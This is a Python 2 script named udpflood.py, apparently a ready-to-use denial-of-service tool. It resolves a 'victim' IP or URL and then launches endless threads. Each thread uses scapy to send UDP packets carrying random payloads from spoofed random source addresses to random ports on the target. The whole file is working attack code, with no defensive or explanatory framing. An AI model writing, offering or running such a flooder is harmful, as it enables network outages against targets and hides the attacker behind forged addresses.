#!/usr/bin/env python
#author Aiden

import socket, random, sys,re ,threading
from scapy.all import *

if len(sys.argv) != 2:
	print "Usage: udpflood.py <target>"
	sys.exit(1) 
victim = sys.argv[1]
sys.tracebacklimit=0

class udpflood(threading.Thread):
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)
	
		def __init__(self):
			threading.Thread.__init__(self)
		def run(self):
			self.check()
			i = IP()
			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
			randomip = i.src
			i.dst = target

			u = UDP()
			u.dport = random.randint(1,65535)
			port = u.dport

			bytes=random._urandom(1024) 

			send(i/u/bytes, verbose=0)

			print "{0} --> {1}:{2}".format(randomip,target,port)
	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)

while True:
	udpflood().start()